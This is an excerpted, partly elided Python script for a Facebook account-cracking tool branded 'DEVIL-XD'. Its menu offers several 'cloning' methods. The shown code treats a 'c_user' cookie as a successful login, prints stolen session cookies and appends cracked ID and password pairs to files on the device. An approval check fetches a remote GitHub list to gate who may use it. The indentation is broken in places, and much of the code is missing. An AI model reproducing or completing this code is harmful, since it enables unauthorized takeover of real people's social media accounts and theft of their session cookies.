#coding=utf
import os
print ("Facebook Group Coming Soon")
os.system("xdg-open https://facebook.com/groups/1079392916067208/")
print ("WEL COME TO DEVIL TOOL LODING...")
...
def menu():
	os.system('clear')
	print(logo)
	print('[1] MATHOD 1 SIMPLE IDS')
	print('[2] MATHOD 2 FAST')
	print('[3] MATHOD 3 WORKING')
	print('[4] MATHOD 4 PUBG CLONING')
	print('[5] MATHOD 5 FREE FIRE CLONING')
    ...
    'viewport-width': '980',
          ...
          #  print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[DEVIL-XD-OK] '+cid+' | '+ps+'\x1b[1;97m')
                print("\33[0;97mCOOKIE : \33[0;97m"+coki)
                open('/sdcard/DEVIL-XD-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                #print('\033[1;33m[DEVIL-XD-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('/sdcard/DEVIL-XD-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97m DEVIL \033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/M4STERMIND1/Approval/blob/main/DEVIL-XD').text
    if id in httpCaht:
